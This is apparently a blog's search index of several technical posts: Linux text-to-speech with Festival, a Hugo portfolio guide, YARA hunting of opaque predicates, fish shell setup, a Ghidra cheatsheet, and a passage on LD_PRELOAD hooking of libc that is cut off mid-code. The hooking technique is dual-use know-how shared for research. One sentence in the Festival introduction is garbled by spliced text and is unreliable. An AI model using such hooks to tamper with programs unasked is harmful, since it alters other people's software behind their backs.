[{"categories":["Docs"],"content":"A guide to using festival TTS as an accessibility tool in Linux","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Introduction Most Linux distributions do not come with a text-to-speech (TTS) engine installed by default. However, there are several open source TTS engines available for Linux that can be installed easily through the package manager. I have dysgraphia, which is a neurological disorder that affects a person’s ability to write. People with dysgraphia may struggle with writing legibly, organizing their thoughts on paper, and/or maintaining consistent spacing and sizing of letters and words. In order to combat this mental limitation, I use TTS to read text more quickly and to proof read what I’m writing. Additionaly, treatment for dysgraphia can include accommodations such as using a cl, you can use the text below. Each voice that you have can be listed in the repl by doing (voice.list). Each voice name, must be prefixed with voomputer instead of handwriting or receiving occupational therapy to improve handwriting skills. It’s important for individuals with dysgraphia to receive support and accommodations to help them succeed in academic and professional settings. The solution I found in this case is festival, which is a free and open-source text-to-speech (TTS) tool for Linux that allows users to generate artificial speech from written text. Festival is highly customizable and supports a range of voices, languages, and output formats. It can be used for a variety of applications, including voice interfaces, screen readers, and language learning tools. ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:1:0","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Installation sudo apt install -y festival ffmpeg xdotool sudo cp /etc/festival.scm ~/.festivalrc ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:2:0","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Version In order to install the correct voices for festival TTS, you need to identify what version you have installed. festival --version Once you determine the version, you can download voices you need by changing the version at the end of the URL. http://festvox.org/packed/festival/2.5/ ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:3:0","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Shortcut Script This bash script, allows you to copy text then have festival read it back and also toggle it off when needed using a keyboard shortcut. #!/usr/bin/env bash if [ \"$(pidof festival)\" ]; then pkill festival; exit 0; fi xdotool key ctrl+c xclip -o | festival --tts sudo cp tts.sh /usr/local/bin/tts sudo chmod +x /usr/local/bin/tts Once completed, you can setup your shortcuts in your distribution like the following. ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:3:1","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Speed up Playback When reading, I find it useful to speed up playback as it allows me to read at a faster pace. You can change the option for atemo to whatever works for you. (Parameter.set 'Audio_Required_Format 'aiff) (Parameter.set 'Audio_Method 'Audio_Command) (Parameter.set 'Audio_Command \"ffplay -hide_banner -loglevel error -nodisp -autoexit -volume 100 -af 'atempo=1.8' $FILE\") ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:4:0","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Set Default Voice Finally, to set the default voice for festival, you can use the text below. Each voice that you have can be listed in the repl by doing (voice.list). Each voice name, must be prefixed with voice_. (set! voice_default 'voice_cmu_us_slt_cg) ","date":"2023-03-09","objectID":"/2023/03/linux-tts-with-festival/:4:1","tags":["Festival","TTS","Accessibility"],"title":"Linux TTS Accessibility with Festival","uri":"/2023/03/linux-tts-with-festival/"},{"categories":["Docs"],"content":"Build your own portfolio with Hugo, Obsidian and GitHub","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Introduction A portfolio website showcases immediate value to employers because it provides a platform to demonstrate your skills, creativity, and achievements. By presenting your best work, you can show employers what you can bring to the table and how you can contribute to their organization. A portfolio website also shows that you are proactive and take pride in your work, which can be attractive to employers who are looking for self-motivated and passionate candidates. In a competitive job market, having a portfolio website can make you stand out from other candidates and give you an edge in the hiring process. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:1:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"GitHub GitHub is a web-based platform for version control and collaborative software development that allows individuals and teams to host and review code, manage projects, and build software in a more organized and efficient way. In this case, we will be using GitHub as a place to save and build our website using Github Pages. GitHub Pages is a free service offered by GitHub that allows users to host static websites and web applications directly from their GitHub repositories. It simplifies the process of publishing content on the web by automatically building and deploying your code changes to a web server, allowing others to access your site via a custom domain or a subdomain of the github.io domain. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:2:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Create an Account To create a GitHub account, first go to the GitHub website and click on the Sign up button in the upper right corner. You will be prompted to enter your email address, a username, and a password. Then click Create account. Next, verify your email address by following the instructions in the confirmation email that GitHub sends you. Finally, customize your profile and start using GitHub to create, store, and collaborate on code. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:2:1","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Create a Repository To create a GitHub repository, first log in to your GitHub account and click on the + icon in the upper right corner, then select New repository. Next, choose a name for your repository (should be \u003cusername\u003e.github.io) and provide an optional description. Finally, set your repository to be public. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:2:2","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Hugo Hugo is a fast and flexible static site generation tool that allows you to create websites quickly and easily. It uses a simple and intuitive directory structure and provides a wide range of themes and templates to choose from, enabling you to create professional-looking websites with minimal effort. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:3:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Installation The command sudo apt install -y hugo installs the Hugo static site generator on a Debian-based Linux system, while hugo version checks its version. We need to identify that we have the +extended version of Hugo as more advanced themes may require it. sudo apt install -y hugo hugo version | grep -i extended ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:3:1","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Create the Site The commands here create a new Hugo website named blog in the current directory, initializes a new Git repository in the blog directory, adds the Ananke theme from GitHub as a Git submodule, appends the line theme = 'ananke'\" to the config.toml file, and creates a new directory named .github/workflows/ in the blog directory. The .github/workflows/ directory can be used to store GitHub Actions. The GitHub Actions automates the building and deployment of your site. hugo new site blog cd blog/ git init git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke themes/ananke echo \"theme = 'ananke'\" \u003e\u003e config.toml mkdir -p .github/workflows/ wget https://raw.githubusercontent.com/c3rb3ru5d3d53c/c3rb3ru5d3d53c.github.io/master/.github/workflows/gh-pages.yml -O .github/workflows/gh-pages.yml ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:3:2","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Create a Post Next, we create a new markdown file named example.md using Hugo, and open it in Vim for editing. Although, you can use any editor you wish. Once completed, we change draft from true to false and add our markdown content. hugo new posts/example.md vim content/posts/example.md ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:3:3","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Build and Test The command hugo build generates a static website by compiling content into HTML and CSS files. Whereas, hugo server starts a local web server to preview changes made to the website before deployment. hugo build hugo server ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:3:4","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Obsidian Obsidian is a note-taking tool that allows users to create and organize their notes in a network of interconnected documents. It uses a Markdown-based text editor and allows for bidirectional linking, which enables users to quickly find and connect related information. Obsidian also has a graph view that visually displays the connections between notes, making it easier to explore and understand the relationships between ideas. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:4:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Installation To install Obsidian, follow the instruction provided on their website here. If you are using a Debian based Linux distribution, you can use the commands provided below; just change the URL to the latest one from the website. wget https://github.com/obsidianmd/obsidian-releases/releases/download/v1.1.9/obsidian_1.1.9_amd64.deb sudo apt install ./obsidian_1.1.9_amd64.deb ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:4:1","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Writing your Blog To more easily write content for your blog, you can open the folder of the website you created with Obsidian as a vault. Once completed, create a new note by clicking on the New Note button in the top left corner. Next, give your note a title by typing it at the top of the note. Finally, write your content using Markdown syntax (a simple markup language). A cheatsheet for writing markdown can be found here. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:4:2","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Publishing your Work Once completed, we can push our code to GitHub, which should begin the build process and serve your site to \u003cusername\u003e.github.io. git add . git commit -m \"First Commit\" git push ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:5:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Conclusion In conclusion, building a portfolio website with Hugo and Obsidian is an excellent way to showcase your work to the world. With the flexibility of Hugo and the powerful note-taking capabilities of Obsidian, you can easily create a personalized website that perfectly represents your skills and accomplishments. Using these tools, you can easily create a portfolio website that is not only beautiful and functional, but also easy to maintain and update. A portfolio website built with Hugo and Obsidian can help you showcase your work to potential clients or employers, and take your career to the next level. So, if you’re looking for an easy and efficient way to build your own portfolio website, then Hugo and Obsidian are definitely worth considering. With a little bit of time and effort, you can create a stunning portfolio that truly represents who you are and what you do. ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:6:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"References Hugo Quickstart Obsidian Website ","date":"2023-02-20","objectID":"/2023/02/hugo-and-obsidian/:7:0","tags":["Obsidian","Hugo","Portfolio"],"title":"Using GitHub Hugo and Obsidian to build a Portfolio","uri":"/2023/02/hugo-and-obsidian/"},{"categories":["Docs"],"content":"Hunting Opaque Predicates with YARA","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"Introduction Malware tends to obfuscate itself using many different techniques from opaque predicates, garbage code, control flow manipulation with the stack and more. These techniques definitely make analysis more challening for reverse engineers. However, from a detection and hunting standpoint to find interesting samples to reverse engineer we can leverage our knowlege of these techniques to hunt for obfuscated code. In our case today, we will be developing a yara signature to hunt for one specific technique of opaque predicates, there are many variations and situations where this does not match and should only serve as a hunting signatures as more heuristic and programitic approaches for this are better for detection. With the limitations in mind, we must first understand what opaque predicates are. In computer programming, an opaque predicate is a predicate, an expression that evaluates to either “true” or “false”, for which the outcome is known by the programmer a priori, but which, for a variety of reasons, still needs to be evaluated at run time. - Wikipedia As the quote from Wikipedia states, opaque predicates are conditional checks in programming where the outcome is always predetermined. To understand this concept better let’s have a look at an example in C (Figure 1). // Compile: gcc -O0 op.c -o op // Run : ./op #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(int argc, char **argv){ int a = 0; int b = 1; if (a != b){ printf(\"foo\\n\"); } printf(\"bar\\n\"); return 0; } Figure 1. Opaque Predicate in C In this case, a will never be equal to b, meaning, foo will always be printed to the console. Additionally, this should also be represented in the assembly code because no optimizations are performed by the compiler because of the argument -O0 being passed to gcc. Analysis of this code can be challenging as basic blocks are created and these conditions can be nested making a mess in our disassemblers and decompilers. We can confirm this by performing the following operations. gcc -O0 op.c -o op objdump -Mintel --disassemble=main op # 115c: c7 45 f8 00 00 00 00 mov DWORD PTR [rbp-0x8],0x0 # 1163: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 # 116a: 8b 45 f8 mov eax,DWORD PTR [rbp-0x8] # 116d: 3b 45 fc cmp eax,DWORD PTR [rbp-0x4] # 1170: 74 0f je 1181 \u003cmain+0x38\u003e Now that we have the basic concept understood in C, let’s have a look at simpler example in assembly (Figure 2). 0: b8 41 41 41 41 mov eax,0x41414141 5: bb 42 42 42 42 mov ebx,0x42424242 a: 39 d8 cmp eax,ebx c: 75 00 jnz e \u003ctest\u003e 0000000e \u003ctest\u003e: e: 90 nop Figure 2. Opaque Predicate in Assembly In this case, we have a combination of two mov instructions moving 32-bit immutable values into 32-bit registers, followed by a cmp instruction checking both the involved registers, and finally a conditional jnz instruction. ","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/:1:0","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"Signature Development Before we can create a yara hunting signature, we need to create the wild carded hex string to match the bytes correctly. To accomplish this, we need to know about x86 instruction encoding for moving immutable values into registers (Table 1). Opcode Mnemonic Description B0+ rb MOV r8,imm8 Move imm8 to r8 B8+ rw MOV r16,imm16 Move imm16 to r16 B8+ rd MOV r32,imm32 Move imm32 to r32 Table 1. Instruction Encoding for mov reg,imm This means we can detect each mov instruction with the yara search pattern b? ?? ?? ?? ??. Next, we need to identify the cmp instruction, for this we can use the yara search pattern 39 ?? ??. Finally, we use the instruction encodings for conditional jump instructions (7?|e3). A reference to instruction encoding for x86 conditional jumps can be found here. With all these considerations we can make the yara signature in Figure 3. rule op { strings: $match = {b? ?? ?? ?? ?? b? ?? ?? ?? ?? 39 ?? (7?|e3)} condition: all of them } Figure 3. Opaque Predicate yara Signature So we can dust our hands off and say we are done right? 🤔 Wrong! 😲 We need to verify the registers in from the mov instructions with the immutable values are used in the cmp instruction. Otherwise, there would be no context for the cmp instruction, as yara does not care at this point what registers are part of the compare only that it is simply a cmp instruction. To accomplish this we need to add logic to the condition. First we must iterate all the matches of our $match string. To accomplish this, we can use a for loop in our condition based on the number of matches (#match) (Figure 4). rule op { strings: $match = {b? ?? ?? ?? ?? b? ?? ?? ?? ?? 39 ?? (7?|e3)} condition: for any i in (0..#match):( // Additional Logic Here ) } Figure 4 Loop Checking Matches for match Next, using the for loop we can get each opcode we ae interested in using uint8(), address of matches @match with bitwise operations to extract and compare the registers in the encoded bytes. In this case, the first two bits of the mov opcodes are the mod/rm bits, and the last three bits indicate what register is being used. 0 1 3 3 4 5 6 7 MOD MOD REG REG REG R/M R/M R/M Table 2. Mod R/M Byte Encoding REG Value 8 16 32 000 al ax eax 001 cl cx ecx 010 dl dx edx 011 bl bx ebx 100 ah sp esp 101 ch bp ebp 110 dh si esi 111 bh di edi Table 3. Register Encoding Now that we have the encodings, we know the first mov instruction involves eax, so and the byte is 0xb8, which in binary is 10 111 000 indicating the last three bits are the values we are interested in. We can single these bits out using a simple mask of 00 000 111 , which is equivelent to 0x7. Thus, 0xb8 \u0026 0x7 will collect the value representing eax. This method will also work for our second mov instruction mathematicly decoding our second register of ebx. Next, we need to decode the registers from the cmp instruction. The operands of the cmp instruction are encoded as 0xd8, which in binary is represented by 11 011 000. To get the first 3 bits, we first need to shift the bits right by 3, then perform masking to avoid trailing bits. This can be performed with the operation 0xd8 \u003e\u003e 3 \u0026 0x7, which results in 011 or ebx. For the next operand we can simply perform the masking operation 0xd7 \u0026 0x7, which results in 000 or eax. Now that we have the bitwise operations to decode the respective operands, we can implement them in our condition (Figure 5). rule op { strings: $match = {b? ?? ?? ?? ?? b? ?? ?? ?? ?? 39 ?? (7?|e3)} condition: for any i in (0..#match):( ( uint8(@match[i]) \u0026 0x7 == uint8(@match[i]+11) \u0026 0x7 and uint8(@match[i]+5) \u0026 0x7 == uint8(@match[i]+11) \u003e\u003e 3 \u0026 0x7 ) ) } Figure 5. Opaque Predicate yara Signature That was exhausting 😫, surely we are done right? 🤔 Wrong! 😲 We need to additionally check for the operands in reverse order, because the register options can swap positions. However, we can just add an or to our condition to make this work (Figure 6). rule op { strings: $match = {b? ?? ?? ?? ?? ","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/:2:0","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"Limitations Because x86 is turring complete, we are limited by the halting problem. In computability theory, the halting problem is the problem of determining, from a description of an arbitrary computer program and an input, whether the program will finish running, or continue to run forever. - Wikipedia This means that given any program with an input we cannot prove if the program will finish running or continue to execute forever. More in the context of our application, given any input, we cannot detect every possible combination of opaque predicates. It is undecidable for which no one algorithm has been proven to solve. The more reliable way to detect opaque prediques would be to use heuristic and programmatic solutions to disassemble and inspect the executable code sections. However, this is also limited by encrypted code containing opaque predicates and of course edge cases and an infinite number of combinations that can be used. In addition to these issue, when performing scans with this signature yara prints the message slowing down scanning, which means that while the signature maybe great for hunting, it is not great from a performance vs. detection standpoint. False positives could also be an issue, as yara scanning does not perform proper disassembly of the application and relies on pattern matching of bytes, which can cause false positives due to alignment issues. We also didn’t account for 8, and 16 bit immutable values being moved into registers. However, with the knowledge you have now, I hope you will be able to make some interesting opaque prediquate hunting yara signatures of your own. ","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/:3:0","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"Conclusion Knowing the limitations of the halting problem and slow scanning when detecting opaque prediques with yara; our opaque predique yara signature can still be used to hunt for interesting obfuscated samples. Additionally, we can use this example as a way to create more opaque predique hunting yara signatures. At the end of the day, hunting and detection is a cat and mouse game for which we do not have a mathematical solution for to be completely safe. Those who win, are those who detect the most, and that is something we can quantify. ","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/:4:0","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"References https://yara.readthedocs.io/en/stable/modules/pe.html http://www.c-jump.com/CIS77/CPU/x86/X77_0060_mod_reg_r_m_byte.htm https://c9x.me/x86/html/file_module_x86_id_176.html http://unixwiz.net/techtips/x86-jumps.html https://en.wikipedia.org/wiki/Opaque_predicate https://en.wikipedia.org/wiki/Halting_problem https://hal.science/hal-02559585 ","date":"2023-02-05","objectID":"/2023/02/opaque-predicate-hunting-with-yara/:5:0","tags":["YARA","Opaque Predicates","Malware","Hunting"],"title":"Hunting Opaque Predicates with YARA","uri":"/2023/02/opaque-predicate-hunting-with-yara/"},{"categories":["Docs"],"content":"How to setup Fish Shell as a User Shell","date":"2023-02-04","objectID":"/2023/02/fish-user-shell/","tags":["Fish","Shell","Linux","Terminal","Guide"],"title":"Fish as a User Shell in Linux","uri":"/2023/02/fish-user-shell/"},{"categories":["Docs"],"content":"Introduction The purpose of this article is to provide reasoning behind why I’m a fish shell user and how to I setup fish 🐟 shell on all my Linux machines. Before we begin, we need to understand what fish shell is. Fish is a Unix shell with a focus on interactivity and usability. Fish is designed to give the user features by default, rather than by configuration. Fish is considered an exotic shell since it does not rigorously adhere to POSIX shell standards, at the discretion of the maintainers. - Wikipedia As the the quote states fish focuses on our interaction with our shell and usability. It provides us features without having to focus on spending much time on customization like zsh, bash and others. Now let’s address some of the common misconceptions in the Linux community regarding fish shell. But it’s not POSIX and you shouldn’t use a shell that is POSIX complaint in Linux! Although you can use fish shell as your system shell, it is not recommended or the primary use case for fish shell. It is designed to be used as a user shell for tasks you need to perform on your system. With that in mind, there are many features you get with fish shell out of the box. Auto suggestions Simple Scripting Man Page Completions 24-bit Color ","date":"2023-02-04","objectID":"/2023/02/fish-user-shell/:1:0","tags":["Fish","Shell","Linux","Terminal","Guide"],"title":"Fish as a User Shell in Linux","uri":"/2023/02/fish-user-shell/"},{"categories":["Docs"],"content":"Installation Now that we have the built-in features out of the way, I install fish shell from the official Linux repositorys, install Oh my Fish (omf) then the lambda theme (Figure 1). sudo apt install -y fish git curl https://raw.githubusercontent.com/oh-my-fish/oh-my-fish/master/bin/install | fish fish omf install lambda Figure 1. Installing fish shell with omf and lambda theme Once completed, I update my gnome terminal to open fish instead of bash (Figure 2). Figure 2. Setting Fish as a User Shell The next small annoyance might be the fish shell default greeting. However, we can remove this by performing the command in Figure 3. printf \"function fish_greeting\\nend\" \u003e ~/.config/fish/functions/fish_greeting.fish Figure 3. Disabling fish Greeting And… you’re done! 🐟🥳 ","date":"2023-02-04","objectID":"/2023/02/fish-user-shell/:2:0","tags":["Fish","Shell","Linux","Terminal","Guide"],"title":"Fish as a User Shell in Linux","uri":"/2023/02/fish-user-shell/"},{"categories":["Docs"],"content":"Conclusion I use fish shell as my user shell in Linux mostly because of it’s auto-completions and built-in features. I hope this encourages you to try fish shell as your user shell in Linux as well. 😅 ","date":"2023-02-04","objectID":"/2023/02/fish-user-shell/:3:0","tags":["Fish","Shell","Linux","Terminal","Guide"],"title":"Fish as a User Shell in Linux","uri":"/2023/02/fish-user-shell/"},{"categories":["Docs"],"content":"References https://fishshell.com/ https://github.com/oh-my-fish/oh-my-fish ","date":"2023-02-04","objectID":"/2023/02/fish-user-shell/:4:0","tags":["Fish","Shell","Linux","Terminal","Guide"],"title":"Fish as a User Shell in Linux","uri":"/2023/02/fish-user-shell/"},{"categories":["Docs"],"content":"A Cheatsheet of Useful Ghidra Python Scripting Snippets","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"This is a cheatsheet I use for Ghidra scripting. NOTE: Some of these functions use each other 😄 ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:0:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Get Python Bytes from Address def get_bytes(address, size): return bytes(map(lambda b: b \u0026 0xff, getBytes(address, size))) ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:1:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Get Section Bytes (Program Tree) def get_section_bytes(section_name): section = getMemoryBlock(section_name) return get_bytes(section.getStart(), section.getSize()) ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:2:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Get Executable Path currentProgram.getExecutablePath() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:3:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Get Program Start Address currentProgram.getMinAddress() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:4:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Get Program End Address currentProgram.getMaxAddress() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:5:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Comments from ghidra.program.model.listing import CodeUnit cu = currentProgram.getListing().getCodeUnitAt(addr) cu.getComment(CodeUnit.EOL_COMMENT) cu.setComment(CodeUnit.EOL_COMMENT, \"Comment text\") ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:6:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Bookmarks createBookmark(addr, 'category', 'description') ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:7:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Functions from ghidra.program.model.symbol import SourceType fm = currentProgram.getFunctionManager() f = fm.getFunctionAt(currentAddress) f = fm.getFunctionContaining(currentAddress) f.setName(\"test\", SourceType.USER_DEFINED) ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:8:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Addresses def get_address(address: int): return currentProgram.getAddressFactory().getAddress(str(hex(address))) address = get_address(0x400000) next_address = address.add(5) current_address = currentLocation.getAddress() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:9:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Labels def get_label(address): result = currentProgram.getListing().getCodeUnitAt(address) if result is None: return None return result.getLabel() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:10:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"Listing def get_codeunit(address): return currentProgram.getListing().getCodeUnitAt(address) codeunit = get_codeunit(address) mnemonic = codeunit.getMnemonicString() number_operands = codeunit.getNumOperands() next_codeunit = codeunit.getNext() prev_codeunit = codeunit.getPrev() ","date":"2023-02-04","objectID":"/2023/02/ghidra-python-cheatsheet.en.md/:11:0","tags":["Cheatsheet","Ghidra","Reversing"],"title":"Ghidra Python Scripting Cheatsheet","uri":"/2023/02/ghidra-python-cheatsheet.en.md/"},{"categories":["Docs"],"content":"How to Hook the C Runtime (libc) in Linux using LD_PRELOAD","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Docs"],"content":"Introduction A friend at work asked me if we can actively change argc when executing a target program without modifying the target program. I was not sure at the time what the solution would be. However, after some thought; I thought about LD_PRELOAD and using it to hook specific functions. I figured, well it probably won’t allow the hooking of libc, but in reality it does. This is of course interesting behavior that can be leveraged for offensive and defensive security research practices. With all that context out of the way, let’s get into it! ","date":"2023-02-04","objectID":"/2023/02/hooking-libc.en.md/:1:0","tags":["Hooking","libc","Linux"],"title":"Hooking C Runtime or libc","uri":"/2023/02/hooking-libc.en.md/"},{"categories":["Docs"],"content":"Technique LD_PRELOAD allows you to prioritize your own shared libraries in Linux; even ahead of libc. In this case, we create the shared library by exporting a function with the name __libc_start_main, which is responsible for parsing argc for number of arguments, argv for the argument array and envp for the array of environment variables. Using this method, it is possible to execute code before the execution of the main function in the target binary. The code to hook main or __libc_start_main is provided in Figure 1. // Compile: gcc hook.c -o hook.so -fPIC -shared // Execute: LD_PRELOAD=./hook.so ./program #define _GNU_SOURCE #include \u003cstdio.h\u003e #include \u003cdlfcn.h\u003e static int (*main_orig)(int, char **, char **); int main_hook(int argc, char **argv, char **envp){ return main_orig(argc, argv, envp); } int __libc_start_main( int (*main)(int, char **, char **), int argc, char **argv, int (*init)(int, char **, char **), void (*fini)(void), void (*rtld_fini)(void), void *stack_end){ main_orig = main; typeof(\u0026__libc_start_main) orig = dlsym(RTLD_NEXT, \"__libc_start_main\"); return 